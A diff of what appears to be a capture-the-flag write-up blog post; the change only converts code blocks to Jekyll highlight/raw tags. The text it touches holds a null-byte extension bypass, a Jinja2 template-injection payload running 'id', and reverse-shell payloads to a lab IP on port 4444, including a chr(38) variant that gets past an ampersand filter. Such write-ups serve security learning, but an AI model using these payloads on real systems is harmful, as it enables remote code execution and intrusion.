@@ -380,7 +380,7 @@ def get_encrypted(passwd):
 ```
 
 <p class="message">
-💡 The ‘<pre>debugpassword.py%00.txt</pre>’ will become ‘<pre>debugpassword.py</pre>’ because the ‘<pre>.txt</pre>’ is ignored after the <strong>NULL BYTE `%00`</strong>
+💡 The ‘<code>debugpassword.py%00.txt</code>’ will become ‘<code>debugpassword.py</code>’ because the ‘<code>.txt</code>’ is ignored after the <strong>NULL BYTE `%00`</strong>
 
 </p>
 
@@ -456,9 +456,11 @@ From the above result, it is easily to recognize that the first input field from
 
 I will test a simple **SSTI Payload**:
 
-```python
+{% highlight python %}
+{% raw %}
 {{ config.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}
-```
+{% endraw %}
+{% endhighlight %}
 
 ![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%208.png)
 
@@ -466,15 +468,19 @@ So it worked! Now, it’s time to delivery the **RCE** payload.
 
 The original is:
 
-```
+{% highlight python %}
+{% raw %}
 {{ config.__init__.__globals__.__builtins__.__import__("os").popen("bash -c \"bash -i >& /dev/tcp/10.9.63.75/4444 0>&1\"") }}
-```
+{% endraw %}
+{% endhighlight %}
 
 But there is the restriction method and it does not allow the ampersand character `&`. Therefore, I have to modify the script to bypass the retrisction:
 
-```
+{% highlight python %}
+{% raw %}
 {{ config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/10.9.63.75/4444 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
-```
+{% endraw %}
+{% endhighlight %}
 
 ![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%209.png)
 
